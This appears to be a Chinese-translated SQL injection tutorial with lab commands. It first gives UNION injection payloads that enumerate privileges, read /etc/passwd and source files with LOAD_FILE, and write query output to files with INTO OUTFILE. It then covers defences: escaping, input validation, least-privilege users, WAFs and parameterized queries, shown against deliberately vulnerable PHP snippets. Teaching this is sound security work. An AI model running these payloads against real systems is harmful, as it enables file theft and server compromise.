
### 用户权限

**测试用户拥有的权限:**

```sql
SELECT super_priv FROM mysql.user
```
添加 `WHERE user="root"` 来查看我们是否拥有root权限

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
显示我们拥有的所有权限。

### 读取文件
需要拥有文件的读取权限
读取/etc/passwd:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
读取源码:
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```


### 写入文件

为了能够使用 MySQL 数据库将文件写入后端服务器，我们需要三件事：

1. 启用了 `FILE` 权限的用户
2. 未启用 MySQL 全局 `secure_file_priv` 变量
3. 对后端服务器上我们想要写入的位置的写入访问权限

**secure_file_priv**
[secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) 变量用于确定从何处读取/写入文件。空值允许我们从整个文件系统中读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取。另一方面，`NULL` 意味着我们无法从任何目录读/写。MariaDB 默认将此变量设置为 empty，如果用户具有 `FILE` 权限，则允许我们读/写任何文件。但是，`MySQL` 使用 `/var/lib/mysql-files` 作为默认文件夹。这意味着使用默认设置时无法通过 `MySQL` 注入读取文件。更糟糕的是，一些现代配置默认为 `NULL，`这意味着我们无法在系统内的任何位置读/写文件。

**查询secure_file_priv的值**
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

但是，由于我们使用的是 `UNION` 注入，因此必须使用 `SELECT` 语句获取该值。这应该不是问题，因为所有变量和大多数配置都存储在 `INFORMATION_SCHEMA` 数据库中。`MySQL` 全局变量存储在一个名为 [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html) 的表中，根据文档，该表有两列 `variable_name` 和 `variable_value`。

我们必须从 `INFORMATION_SCHEMA` 数据库中的表中选择这两列。MySQL 配置中有数百个全局变量，我们不想检索所有变量。然后，我们将使用我们在上一节中了解的 `WHERE` 子句过滤结果以仅显示 `secure_file_priv` 变量。
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

现在我们已经确认了我们的用户应该将文件写入后端服务器，让我们尝试使用 `SELECT 来执行此操作。INTO OUTFILE` 语句。[SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) 语句可用于将 select 查询中的数据写入文件。这通常用于从表中导出数据。

要使用它，我们可以在查询后添加 `INTO OUTFILE '...'` 以将结果导出到我们指定的文件中。以下示例将 `users` 表的输出保存到 `/tmp/credentials` 文件中：

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```


### 缓解



---

我们已经了解了 SQL 注入、它们发生的原因以及如何利用它们。我们还应该学习如何避免代码中的这些类型的漏洞，并在发现时进行修补。让我们看一些如何缓解 SQL 注入的示例。

---

**输入清理**

以下是我们之前讨论的身份验证绕过部分的代码片段：


```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
  echo "Executing query: " . $query . "<br /><br />";

  if (!mysqli_query($conn ,$query))
  {
          die('Error: ' . mysqli_error($conn));
  }

  $result = mysqli_query($conn, $query);
  $row = mysqli_fetch_array($result);
<SNIP>
```

正如我们所看到的，该`脚本从 POST` 请求中获取`用户名和密码`，并将其直接传递给查询。这将允许攻击者注入他们想要的任何东西并利用该应用程序。可以通过清理任何用户输入来避免注入，从而使注入的查询变得无用。库提供了多种函数来实现这一点，其中一个例子是 [mysqli_real_escape_string（）](https://www.php.net/manual/en/mysqli.real-escape-string.php) 函数。此函数对 `'` 和 `“` 等字符进行转义，因此它们没有任何特殊含义。


```php
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>
```

上面的代码片段显示了如何使用该函数。

正如预期的那样，由于转义了单引号，注入不再有效。一个类似的例子是 [pg_escape_string（）](https://www.php.net/manual/en/function.pg-escape-string.php) 它用于转义 PostgreSQL 查询。

---

##  输入验证

还可以根据用于查询的数据来验证用户输入，以确保它与预期的输入匹配。例如，当将电子邮件作为输入时，我们可以验证输入是否采用 `...@email.com` 的形式，依此类推。

请考虑 ports 页面中的以下代码片段，我们在该页面上使用了 `UNION` 注入：


```php
<?php
if (isset($_GET["port_code"])) {
	$q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
	$result = pg_query($conn,$q);
    
	if (!$result)
	{
   		die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
	}
<SNIP>
?>
```

我们看到 GET 参数`port_code`直接在查询中使用。众所周知，端口代码仅由字母或空格组成。我们可以将用户输入限制为仅这些字符，这将防止注入查询。正则表达式可用于验证输入：


```php
<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>
```

将代码修改为使用 [preg_match（）](https://www.php.net/manual/en/function.preg-match.php) 函数，该函数检查输入是否与给定模式匹配。使用的模式是 `[A-Za-z\s]+`，它只会匹配包含字母和空格的字符串。任何其他字符都将导致脚本终止。

我们可以测试以下注入：

 代码： sql

```sql
'; SELECT 1,2,3,4-- -
```


---

##  用户权限

正如最初所讨论的，DBMS 软件允许创建具有精细权限的用户。我们应该确保查询数据库的用户只具有最低权限。

超级用户和具有管理权限的用户绝不应与 Web 应用程序一起使用。这些帐户可以访问功能和特性，这可能会导致服务器被盗用。

   缓解 SQL 注入

```shell-session
MariaDB [(none)]> CREATE USER 'reader'@'localhost';

Query OK, 0 rows affected (0.002 sec)


MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';

Query OK, 0 rows affected (0.000 sec)
```

上面的命令添加了一个名为 `reader` 的新 MariaDB 用户，该用户仅被授予对 `ports` 表的 `SELECT` 权限。我们可以通过登录来验证此用户的权限：

   缓解 SQL 注入

```shell-session
Turtlera@htb[/htb]$ mysql -u reader -p

MariaDB [(none)]> use ilfreight;
MariaDB [ilfreight]> SHOW TABLES;

+---------------------+
| Tables_in_ilfreight |
+---------------------+
| ports               |
+---------------------+
1 row in set (0.000 sec)


MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| information_schema |
| ilfreight          |
+--------------------+
2 rows in set (0.000 sec)


MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
```

上面的代码段确认`了 reader` 用户无法查询 `ilfreight` 数据库中的其他表。用户只能访问应用程序所需的 `ports` 表。

---

##  Web 应用程序防火墙

Web 应用程序防火墙 （WAF） 用于检测恶意输入并拒绝任何包含恶意输入的 HTTP 请求。这有助于防止 SQL 注入，即使应用程序逻辑有缺陷。WAF 可以是开源的 （ModSecurity） 或高级的 （Cloudflare）。它们中的大多数都根据常见的 Web 攻击配置了默认规则。例如，任何包含字符串 `INFORMATION_SCHEMA` 的请求都将被拒绝，因为它在利用 SQL 注入时通常使用。

---

##  参数化查询

确保安全清理输入的另一种方法是使用参数化查询。参数化查询包含输入数据的占位符，然后驱动程序对其进行转义和传递。我们不是直接将数据传递到 SQL 查询中，而是使用占位符，然后用 PHP 函数填充它们。

请考虑以下修改后的代码：

 代码： php

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>
```

查询被修改为包含两个占位符，标记为 `？`，其中将放置用户名和密码。然后，我们使用 [mysqli_stmt_bind_param（）](https://www.php.net/manual/en/mysqli-stmt.bind-param.php) 函数将用户名和密码绑定到查询。这将安全地转义任何引号并将值放在查询中。

---

##  结论

上面的列表并不详尽，仍然可以根据应用程序逻辑利用 SQL 注入。显示的代码示例基于 PHP，但其逻辑适用于所有常见语言和库。



